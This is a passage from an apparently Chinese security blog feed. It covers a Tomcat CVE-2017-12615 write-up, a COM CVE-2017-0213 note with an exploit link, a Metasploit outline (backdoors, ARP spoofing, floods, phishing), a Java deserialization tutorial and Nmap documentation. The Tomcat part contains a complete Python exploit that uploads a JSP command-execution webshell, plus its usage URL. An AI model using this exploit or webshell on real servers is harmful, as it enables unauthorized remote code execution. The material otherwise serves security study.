<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&amp;lt;</span>init-param<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>param-name<span class="symbol">&amp;gt;</span>readonly<span class="symbol">&amp;lt;</span>/param-name<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>param-value<span class="symbol">&amp;gt;</span>true<span class="symbol">&amp;lt;</span>/param-value<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>/init-param<span class="symbol">&amp;gt;</span></span><br></pre></td></tr></table></figure>

<p>​    还是<strong>web.xml</strong>目录，确保readonly的参数为true（默认值），即不允许DELETE和PUT操作</p>
<h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>1、查看Tomcat版本号</p>
<p><img src="/images/CVE-2017-12615/2.png" alt="2"></p>
<p>该版本存在Tomcat远程代码执行漏洞</p>
<p>2、下载Payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! -*- coding:utf-8 -*- </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">body = <span class="string">'''&amp;lt;%@ page language=&amp;quot;java&amp;quot; import=&amp;quot;java.util.*,java.io.*&amp;quot; pageEncoding=&amp;quot;UTF-8&amp;quot;%&amp;gt;&amp;lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+&amp;quot;\\n&amp;quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&amp;gt;&amp;lt;%if(&amp;quot;023&amp;quot;.equals(request.getParameter(&amp;quot;pwd&amp;quot;))&amp;amp;&amp;amp;!&amp;quot;&amp;quot;.equals(request.getParameter(&amp;quot;cmd&amp;quot;)))&#123;out.println(&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;+excuteCmd(request.getParameter(&amp;quot;cmd&amp;quot;))+&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);&#125;else&#123;out.println(&amp;quot;:-)&amp;quot;);&#125;%&amp;gt;'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    conn = httplib.HTTPConnection(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    conn.request(method=<span class="string">'OPTIONS'</span>, url=<span class="string">'/ffffzz'</span>)</span><br><span class="line"></span><br><span class="line">    headers = dict(conn.getresponse().getheaders())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'allow'</span> <span class="keyword">in</span> headers <span class="keyword">and</span> \</span><br><span class="line"></span><br><span class="line">       headers[<span class="string">'allow'</span>].find(<span class="string">'PUT'</span>) &amp;gt; <span class="number">0</span> :</span><br><span class="line"></span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">        conn = httplib.HTTPConnection(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        url = &amp;quot;/&amp;quot; + str(int(time.time()))+<span class="string">'.jsp/'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#url = &amp;quot;/&amp;quot; + str(int(time.time()))+'.jsp::$DATA'</span></span><br><span class="line"></span><br><span class="line">        conn.request( method=<span class="string">'PUT'</span>, url= url, body=body)</span><br><span class="line"></span><br><span class="line">        res = conn.getresponse()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> res.status  == <span class="number">201</span> :</span><br><span class="line"></span><br><span class="line">            <span class="comment">#print 'shell:', 'http://' + sys.argv[1] + url[:-7]</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'shell:'</span>, <span class="string">'http://'</span> + sys.argv[<span class="number">1</span>] + url[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> res.status == <span class="number">204</span> :</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'file exists'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'error'</span></span><br><span class="line"></span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Server not vulnerable'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception,e:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Error:'</span>, e</span><br></pre></td></tr></table></figure>



<p>3、利用payload对网站进行恶意访问</p>
<p><img src="/images/CVE-2017-12615/3.png" alt="3"></p>
<p>执行后返回webshell的地址，访问</p>
<p><code>http://171.xx.xx.x:8080/1545287081.jsp?&amp;pwd=023&amp;cmd=ipconfig</code></p>
<p>即可执行命令</p>
<p><img src="/images/CVE-2017-12615/4.png" alt="4"></p>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-0213(COM 类型混淆漏洞)</title>
    <url>/2018/12/11/CVE-2017-0213(COM%20%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E)/</url>
    <content><![CDATA[<h1 id="CVE-2017-0213-COM-类型混淆漏洞"><a href="#CVE-2017-0213-COM-类型混淆漏洞" class="headerlink" title="CVE-2017-0213(COM 类型混淆漏洞)"></a>CVE-2017-0213(COM 类型混淆漏洞)</h1><h4 id="一、简介COM"><a href="#一、简介COM" class="headerlink" title="一、简介COM"></a>一、简介COM</h4><p>​    微软组建对象模型（COM）定义了用于创建在运行时交互的可重用的软件库的二进制互操作系统。使用CMO库，而不汇编成应用程序的需要。COM定义了软件组件互相通讯的方式。它是一种二进制和网络标准，允许任意两个组件互相通讯，而不管它们是在什么计算机上运行（只要计算机是相连的），也不管计算机运行的是什么操作系统（只要该操作系统支持COM），也不管该组件是用什么语言编写的。COM还提供了位置透明性：当使用COM组件时，该组件是进程内Dll、本地exe还是位于其他机器上的组件。</p>
<a id="more"></a>
<p><strong>理论上，COM可以被移植到任何操作系统上，但是现实中COM依然只是Windows世界的东西</strong></p>
<h4 id="二、漏洞介绍"><a href="#二、漏洞介绍" class="headerlink" title="二、漏洞介绍"></a>二、漏洞介绍</h4><p>​    参考文章：<a href="http://www.voidcn.com/article/p-ukjxxpit-boa.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-ukjxxpit-boa.html</a> </p>
<p>漏洞影响版本：</p>
<p><img src="/images/CVE-2017-0213/1.png" alt="1"></p>
<p>漏洞利用工具下载地址：<a href="https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213" target="_blank" rel="noopener">https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213</a></p>
<p>漏洞利用：</p>
<p><img src="https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/CVE-2017-0213/win10.png" alt="img"> </p>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>MSF渗透利用</title>
    <url>/2018/12/05/MSF%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p><strong>MSF渗透利用</strong></p>
<h4 id="一、PC渗透与防御"><a href="#一、PC渗透与防御" class="headerlink" title="一、PC渗透与防御"></a>一、PC渗透与防御</h4><p>通过SMB协议可出发的Server服务漏洞</p>
<table>
<thead>
<tr>
<th align="center">缺陷类型</th>
<th align="center">缺陷具体信息</th>
<th>攻击方式</th>
<th>Metasploit模块</th>
</tr>
</thead>
<tbody><tr>
<td align="center">系统用户弱口令</td>
<td align="center">XXX:XXX</td>
<td>SMB，远程桌面口令猜解攻击</td>
<td></td>
</tr>
<tr>
<td align="center">FTP服务配置缺陷</td>
<td align="center">弱口令</td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">匿名上传目录</td>
<td align="center">FTP口令猜测攻击</td>
<td>ftp_login</td>
<td></td>
</tr>
<tr>
<td align="center">SMB协议可触发的Server服务漏洞</td>
<td align="center">MS08-067</td>
<td>网络服务渗透攻击</td>
<td>ms08_067_netapi</td>
</tr>
<tr>
<td align="center">Oracle数据库TNS服务漏洞</td>
<td align="center">CVE-2009-1979</td>
<td>网络服务渗透攻击</td>
<td>tns_auth_sesskey</td>
</tr>
<tr>
<td align="center">King View SCADA软件服务漏洞</td>
<td align="center">CVE-2011-0406</td>
<td>网络服务渗透攻击</td>
<td>In-the-wild</td>
</tr>
<tr>
<td align="center">RPC DCOM服务漏洞</td>
<td align="center">MS03-026</td>
<td>网络服务渗透攻击</td>
<td>ms_026_dcom</td>
</tr>
<tr>
<td align="center">SMB服务Netapi了漏洞</td>
<td align="center">MS06-040</td>
<td>网络服务渗透攻击</td>
<td>ms06_040_netapi</td>
</tr>
</tbody></table>
<p>​     <strong>msf常见命令</strong></p>
<a id="more"></a>
<p><img src="/images/MSF/3.png" alt="3"></p>
<p><strong>防御手段：</strong></p>
<p>win10端口策略，</p>
<p>netstat -ano: find “ESTABLISHED”关闭ESTABLISHED的端口连接</p>
<h4 id="二、EXE-APK后门"><a href="#二、EXE-APK后门" class="headerlink" title="二、EXE,APK后门"></a>二、EXE,APK后门</h4><p><img src="/images/MSF/1.png" alt="1"></p>
<p>生成-&gt;接受</p>
<h4 id="三、内网ARP"><a href="#三、内网ARP" class="headerlink" title="三、内网ARP"></a>三、内网ARP</h4><p>1.内网操作</p>
<p>2.欺骗</p>
<p>3.图片截取</p>
<p>4.传输报文的截取</p>
<p><img src="/images/MSF/2.png" alt="2"></p>
<p><strong>泛洪</strong></p>
<p>​    1.ICMP泛洪（ICMP flood）：是利用ICMP报文进行攻击的一种方法。如果攻击者向目标主机发送大量的ICMP ECHO报文，将产生ICMP泛洪，目标主机会利用大量的时间和资源用于处理ICMP ECHO报文，而无法处理正常的请求或响应，从而实现对目标主机的攻击。</p>
<p>​    2.UDP泛洪：原理与ICMP泛洪相似，攻击者通过向目标主机发送大量的UDP报文，导致目标主机忙于处理UDP报文，而无法处理正常的报文请求或响应。</p>
<p>​    3.MAC泛洪：交换机中一张非常重要的由硬件组成的表叫做mac表，主要完成快速转发。mac表由大小限制不同的交换机的mac表的大小都有不同，越是高端的交换机的表的空间越大，但是作为接入交换机，表空间基本都在8K左右。交换机的一个原理是会自动学习并记录mac地址。而攻击者就利用交换机的mac地址学习机制不断的进行mac地址刷新，迅速填满交换机的mac地址表，以至崩溃，使交换机不得不使用广播发包，从而获取其他人的报文信息。</p>
<h4 id="四、钓鱼网站"><a href="#四、钓鱼网站" class="headerlink" title="四、钓鱼网站"></a>四、钓鱼网站</h4><p>​    1.假冒电子邮件</p>
<p>​    2.假冒登录，游戏账号等数据获取</p>
<p>​    3.网上银行等H5页面    </p>
<p>​    4.WEB应用程序漏洞</p>
]]></content>
  </entry>
  <entry>
    <title>Java序列化与反序列化</title>
    <url>/2018/11/04/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="Java序列化与反序列化"><a href="#Java序列化与反序列化" class="headerlink" title="Java序列化与反序列化"></a><strong>Java</strong>序列化与反序列化</h1><h4 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h4><p>​        反序列化就是把对象的<strong>状态信息</strong>转换为<strong>字节序列</strong>（可以存储或传输的形式）过程。</p>
<p>​        反序列化即逆过程，由字节流还原成对象。</p>
<p>​        注：字节序是指多字节数据在计算机内存中存储或者网络传输时各字节的存储顺序。</p>
<p>​                        <strong>ObjectOutputStream类的writeObject()方法可以实现序列化。</strong> </p>
<p>​                        <strong>ObjectInputStream类的readObject()方法用于反序列化。</strong> </p>
<a id="more"></a>
<p><img src="/images/java/1.png" alt="1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">序列化与反序列化是让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。</span><br></pre></td></tr></table></figure>

<h4 id="用途："><a href="#用途：" class="headerlink" title="用途："></a>用途：</h4><p>​        ①把对象的字节序列永久保存在硬盘上，通常存放在一个文件中；</p>
<p>​        ②在网络上传送对象的字节序列。</p>
<h4 id="应用场景："><a href="#应用场景：" class="headerlink" title="应用场景："></a>应用场景：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP：多平台之间的通信，管理等</span><br><span class="line">RMI：是Java的一组拥护开发分布式应用程序的API，实现了不同操作系统之间程序的方法调用。值得注意的是，RMI的传输100%基于反序列化，Java RMI的默认端口是1099端口。</span><br><span class="line">JMX：JMX是一套标准的代理和服务，用户可以在任何Java应用程序中使用这些代理和服务实现管理,中间件软件WebLogic的管理页面就是基于JMX开发的，而JBoss则整个系统都基于JMX构架。</span><br></pre></td></tr></table></figure>



<h4 id="Java中API的实现："><a href="#Java中API的实现：" class="headerlink" title="Java中API的实现："></a>Java中API的实现：</h4><p>​        位置：         <strong>Java.io.ObjectOutputStream        Java.io.ObjectInputStream</strong></p>
<p>​        序列化：    <strong>ObjectOutPutStream 类   –&gt;      writeObject()</strong></p>
<p>​     注：该方法对参数指定的obj对象进行序列化，把字节序列写到一个目标输出流中 </p>
<p>​         按Java的标准约定是给文件一个.ser扩展名</p>
<p>​        反序列化： <strong>ObjectIntPutStream 类    –&gt;       readObject()</strong></p>
<p>​    注：该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">import java.io.ObjectOutputStream;</span></span><br><span class="line"><span class="comment">import java.io.ObjectInputStream;</span></span><br><span class="line"><span class="comment">import java.io.FileOutputStream;</span></span><br><span class="line"><span class="comment">import java.io.FileInputStream;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Java_Test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String obj = <span class="string">"ls "</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将序列化对象写入文件object.txt中</span></span><br><span class="line">        FileOutputStream fos  = <span class="keyword">new</span> FileOutputStream(<span class="string">"aa.ser"</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从文件object.txt中读取数据</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"aa.ser"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反序列化恢复对象obj</span></span><br><span class="line">        String obj2 = (String)ois.readObject();</span><br><span class="line">        System.out.println(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="Java实现序列化和反序列化"><a href="#Java实现序列化和反序列化" class="headerlink" title="Java实现序列化和反序列化"></a>Java实现序列化和反序列化</h4><p><strong>1.JDK类库中序列化和反序列化API</strong></p>
<p>（1）java.io.ObjectOutputStream：表示对象输出流；</p>
<p>它的writeObject(Object obj)方法可以对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中；</p>
<p>（2）java.io.ObjectInputStream：表示对象输入流；</p>
<p>它的readObject()方法源输入流中读取字节序列，再把它们反序列化成为一个对象，并将其返回。</p>
<p><strong>2.实现序列化的要求</strong></p>
<p>只有实现了Serializable或Externalizable接口的类的对象才能被序列化，否则抛出异常。</p>
<p><strong>3.实现Java对象序列化与反序列化的方法</strong></p>
<p>假定一个User类，它的对象需要序列化，可以有如下三种方法：</p>
<p>（1）若User类仅仅实现了Serializable接口，则可以按照以下方式进行序列化和反序列化</p>
<p>ObjectOutputStream采用默认的序列化方式，对User对象的非transient的实例变量进行序列化。<br>ObjcetInputStream采用默认的反序列化方式，对对User对象的非transient的实例变量进行反序列化。</p>
<p>（2）若User类仅仅实现了Serializable接口，并且还定义了readObject(ObjectInputStream in)和writeObject(ObjectOutputSteam out)，则采用以下方式进行序列化与反序列化。</p>
<p>ObjectOutputStream调用User对象的writeObject(ObjectOutputStream out)的方法进行序列化。<br>ObjectInputStream会调用User对象的readObject(ObjectInputStream in)的方法进行反序列化。</p>
<p>（3）若User类实现了Externalnalizable接口，且User类必须实现readExternal(ObjectInput in)和writeExternal(ObjectOutput out)方法，则按照以下方式进行序列化与反序列化。</p>
<p>ObjectOutputStream调用User对象的writeExternal(ObjectOutput out))的方法进行序列化。 </p>
<p>ObjectInputStream会调用User对象的readExternal(ObjectInput in)的方法进行反序列化。</p>
<p><strong>4.JDK类库中序列化的步骤</strong></p>
<p><strong>步骤一</strong>：创建一个对象输出流，它可以包装一个其它类型的目标输出流，如文件输出流：</p>
<p><strong>步骤二</strong>：通过对象输出流的writeObject()方法写对象：</p>
<p><strong>5.通过对象输出流的readObject()读取对象</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User user &#x3D; (User) ois.readObject();</span><br></pre></td></tr></table></figure>



<p><strong>示例</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerialDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object.out"</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        User user1 = <span class="keyword">new</span> User(<span class="string">"xxx"</span>, <span class="string">"123456"</span>, <span class="string">"male"</span>);</span><br><span class="line">        oos.writeObject(user1);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"object.out"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        User user2 = (User) ois.readObject();</span><br><span class="line">        System.out.println(user2.getUserName()+ <span class="string">" "</span> + </span><br><span class="line">            user2.getPassword() + <span class="string">" "</span> + user2.getSex());</span><br><span class="line">        <span class="comment">//反序列化的输出结果为：xxx 123456 male</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">    <span class="comment">//全参构造方法、get和set方法省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>object.out文件如下</strong> <img src="/images/java/2.png" alt="2"></p>
<p>注：上图中0000000h-000000c0h表示行号；0-f表示列；行后面的文字表示对这行16进制的解释 </p>
<p><strong>Java反序列化漏洞由来：</strong></p>
<p>1、由于很多站点或者RMI仓库等接口处存在java的反序列化功能，攻击者可以通过构造特定的恶意对象序列化后的流，让目标反序列化，从而达到自己的恶意预期行为，包括命令执行，甚至getshell等等。</p>
<p>2、Apache Commons Collections</p>
<p>这是开源小组Apache研发的一个Collections收集器框架，提供诸如list、set、queue等功能对象。这个框架中有一个接口，其中有一个实现该接口的类可以通过调用java的反射机制来调用任意函数，这个接口类是InvokerTransformer。这个架构的广泛使用，也导致了java反序列化漏洞的大面积流行。</p>
]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmap基本使用</title>
    <url>/2018/10/26/Nmap/</url>
    <content><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Nmap是一款强大的安全扫描器，用于探测计算机网络中的主机，服务以及开放端口。它有很多特性，比如隐形扫描(stealth scan)，主动扫描(aggressive scan)，防火墙规避扫描(firewall evasio scan)，而且能够识别操作系统。它有自己的Nmap脚本引擎，利用该引擎，可以借助Lua编程语言开发自定义的脚本程序。</p>
<h4 id="一-名称"><a href="#一-名称" class="headerlink" title="一.名称"></a>一.名称</h4><p>nmap-网络探测和安全扫描工具</p>
<h4 id="二-语法"><a href="#二-语法" class="headerlink" title="二.语法"></a>二.语法</h4><p>nmap   &lt;Scan Type(s)&gt;   <Options></Options></p>
<a id="more"></a>
<h4 id="三-描述"><a href="#三-描述" class="headerlink" title="三.描述"></a>三.描述</h4><p>nmap是一个网络探测和安全扫描程序，系统管理者和个人可以使用这个软件扫描大型的网络，获取那台主机正在运行以及提供什么服务等信息。nmap支持很多扫描技术，例如：UDP、TCP connect()、TCP SYN(半开扫描)、ftp代理(bounce攻击)、反向标志、ICMP、FIN、ACK扫描、圣诞树(Xmas Tree)、SYN扫描和null扫描。从扫描类型一节可以得到细节。nmap还提供了一些高级的特征，例如：通过TCP/IP协议栈特征探测操作系统类型，秘密扫描，动态延时和重传计算，并行扫描，通过并行ping扫描探测关闭的主机，诱饵扫描，避开端口过滤检测，直接RPC扫描(无须端口影射)，碎片扫描，以及灵活的目标和端口设定。 </p>
<p>nmap运行通常会得到被扫描主机端口的列表。nmap总会给出well known端口的服务名(如果可能)、端口号、状态和协议等信息。每个端口的状态有：open、filtered、unfiltered。open状态意味着目标主机能够在这个端口使用accept()系统调用接受连接。filtered状态表示：防火墙、包过滤和其它的网络安全软件掩盖了这个端口，禁止 nmap探测其是否打开。unfiltered表示：这个端口关闭，并且没有防火墙/包过滤软件来隔离nmap的探测企图。通常情况下，端口的状态基本都是unfiltered状态，只有在大多数被扫描的端口处于filtered状态下，才会显示处于unfiltered状态的端口。</p>
<p>根据使用的功能选项，nmap也可以报告远程主机的下列特征：使用的操作系统、TCP序列、运行绑定到每个端口上的应用程序的用户名、DNS名、主机地址是否是欺骗地址、以及其它一些东西。</p>
<h4 id="四-功能选项"><a href="#四-功能选项" class="headerlink" title="四.功能选项"></a>四.功能选项</h4><p>功能选项可以组合使用。一些功能选项只能够在某种扫描模式下使用。nmap会自动识别无效或者不支持的功能选项组合，并向用户发出警告信息。 </p>
<p>nmap-h可以快速列出功能选项的列表</p>
<p><strong>1）扫描类型</strong></p>
<p>-sT ：TCP connect()扫描</p>
<p>最基本的TCP扫描方式， connect()是一种系统调用，由操作系统提供，用来打开一个连接。如果目标端口有程序监听， connect()就会成功返回，否则这个端口是不可达的。 这种扫描很容易被检测到，在目标主机的日志中会记录大批的连接请求以及错误信息。</p>
<p>-sS ：TCP同步扫描(TCP SYN)</p>
<p>通常称为半开扫描(half-open),如果对方返回SYN|ACK(响应)包就表示目标端口正在监听；如果返回RST数据包，就表示目标端口没有监听程序；如果收到一个SYN|ACK包，源主机就会马上发出一个<strong>RST(复位)</strong>数据包断开和目标主机的连接 。很少有系统能将其记入系统日志。但是需要root权限来定制SYN数据包。</p>
<p>-sF,-sF，-sN ：秘密FIN数据包扫描，空(NULL)扫描模式</p>
<p>即使SYN扫描都无法确定的情况下使用。一些防火墙和包过滤软件能够对发送到被限制端口的SYN数据包进行监视</p>
<p><strong>扫描依据：</strong>关闭的端口需要对你的探测包回应RST包，而打开的端口必需忽略有问题的包 。</p>
<p>-sP : ping扫描</p>
<p>有时你只是想知道此时网络上哪些主机正在运行。通过向指定的网络内的每个IP地址发送ICMP echo请求数据包，nmap就可以完成这项任务。如果主机正在运行就会作出响应。不幸的是，一些站点例如：microsoft.com阻塞ICMP echo请求数据包。然而，在默认的情况下nmap也能够向80端口发送TCP ack包，如果你收到一个RST包，就表示主机正在运行。nmap使用的第三种技术是：发送一个SYN包，然后等待一个RST或者SYN/ACK包。对于非root用户，nmap使用connect()方法。</p>
<p>在默认的情况下(root用户)，nmap并行使用ICMP和ACK技术。</p>
<p><strong>nmap在任何情况下都会进行ping扫描，只有目标主机处于运行状态，才会进行后续的扫描。如果你只是想知道目标主机是否运行，而不想进行其它扫描，才会用到这个选项。</strong></p>
<p>-sU：UDP扫描</p>
<p>如果你想知道在某台主机上提供哪些UDP(用户数据报协议,RFC768)服务，可以使用这种扫描方法。nmap首先向目标主机的每个端口发出一个0字节的UDP包，如果我们收到端口不可达的ICMP消息，端口就是关闭的，否则我们就假设它是打开的。</p>
<p>-sA ：ACK扫描</p>
<p>这项高级的扫描方法通常用来穿过防火墙的规则集。通常情况下，这有助于确定一个防火墙是功能比较完善的或者是一个简单的包过滤程序，只是阻塞进入的SYN包。这种扫描是向特定的端口发送ACK包(使用随机的应答/序列号)。如果返回一个RST包，这个端口就标记为unfiltered状态。如果什么都没有返回，或者返回一个不可达ICMP消息，这个端口就归入filtered类。注意，nmap通常不输出unfiltered的端口，所以在输出中通常不显示所有被探测的端口。 </p>
<p><strong>2）通用选项</strong></p>
<p>-P0</p>
<p>在扫描之前，不必ping主机。有些网络的防火墙不允许ICMP echo请求穿过，使用这个选项可以对这些网络进行扫描。microsoft.com就是一个例子，因此在扫描这个站点时，你应该一直使用-P0或者-PT 80选项。</p>
<p>-PT</p>
<p>扫描之前，使用TCP ping确定哪些主机正在运行。nmap不是通过发送ICMP echo请求包然后等待响应来实现这种功能，而是向目标网络(或者单一主机)发出TCP ACK包然后等待回应。如果主机正在运行就会返回RST包。只有在目标网络/主机阻塞了ping包，而仍旧允许你对其进行扫描时，这个选项才有效。对于非 root用户，我们使用connect()系统调用来实现这项功能。使用-PT &lt;端口号&gt;来设定目标端口。默认的端口号是80，因为这个端口通常不会被过滤。</p>
<p>-PS</p>
<p>对于root用户，这个选项让nmap使用SYN包而不是ACK包来对目标主机进行扫描。如果主机正在运行就返回一个RST包(或者一个SYN/ACK包)。</p>
<p>-PI</p>
<p>设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。使用这个选项让nmap发现正在运行的主机的同时，nmap也会对你的直接子网广播地址进行观察。直接子网广播地址一些外部可达的IP地址，把外部的包转换为一个内向的IP广播包，向一个计算机子网发送。这些IP广播包应该删除，因为会造成拒绝服务攻击(例如 smurf)。</p>
<p>-PB</p>
<p>这是默认的ping扫描选项。它使用ACK(-PT)和ICMP(-PI)两种扫描类型并行扫描。如果防火墙能够过滤其中一种包，使用这种方法，你就能够穿过防火墙。</p>
<p>-O</p>
<p>这个选项激活对TCP/IP指纹特征(fingerprinting)的扫描，获得远程主机的标志。换句话说，nmap使用一些技术检测目标主机操作系统网络协议栈的特征。nmap使用这些信息建立远程主机的指纹特征，把它和已知的操作系统指纹特征数据库做比较，就可以知道目标主机操作系统的类型。</p>
<p>-I</p>
<p>这个选项打开nmap的反向标志扫描功能。ident协议(rfc 1413)允许使用TCP连接给出任何进程拥有者的用户名，即使这个进程并没有初始化连接。例如，你可以连接到HTTP端口，接着使用identd确定这个服务器是否由root用户运行。这种扫描只能在同目标端口建立完全的TCP连接时(例如：-sT扫描选项)才能成功。使用-I选项是，远程主机的 identd精灵进程就会查询在每个打开的端口上监听的进程的拥有者。显然，如果远程主机没有运行identd程序，这种扫描方法无效。</p>
<p>-f</p>
<p>这个选项使nmap使用碎片IP数据包发送SYN、FIN、XMAS、NULL。使用碎片数据包增加包过滤、入侵检测系统的难度，使其无法知道你的企图。虽然包过滤器和防火墙不能防这种方法，但是有很多网络出于性能上的考虑，禁止数据包的分片。</p>
<p>注意这个选项不能在所有的平台上使用。它在Linux、FreeBSD、OpenBSD以及其它一些UNIX系统能够很好工作。</p>
<p>-v</p>
<p>冗余模式。它会给出扫描过程中的详细信息。使用这个选项，你可以得到事半功倍的效果。使用-d选项可以得到更加详细的信息。</p>
<p>-h</p>
<p>快速参考选项。</p>
<p>-oN</p>
<p>把扫描结果重定向到一个可读的文件logfilename中。</p>
<p>-oM</p>
<p>把扫描结果重定向到logfilename文件中，这个文件使用主机可以解析的语法。你可以使用-oM -来代替logfilename，这样输出就被重定向到标准输出stdout。在这种情况下，正常的输出将被覆盖，错误信息荏苒可以输出到标准错误 stderr。要注意，如果同时使用了-v选项，在屏幕上会打印出其它的信息。</p>
<p>-iR</p>
<p>让nmap自己随机挑选主机进行扫描。</p>
<p>-p &lt;端口范围&gt;</p>
<p>这个选项让你选择要进行扫描的端口号的范围。例如，-p 23表示：只扫描目标主机的23号端口。-p 20-30,139,60000-表示：扫描20到30号端口，139号端口以及所有大于60000的端口。在默认情况下，nmap扫描从1到1024号以及nmap-services文件(如果使用RPM软件包，一般在/usr/share/nmap/目录中)中定义的端口列表。</p>
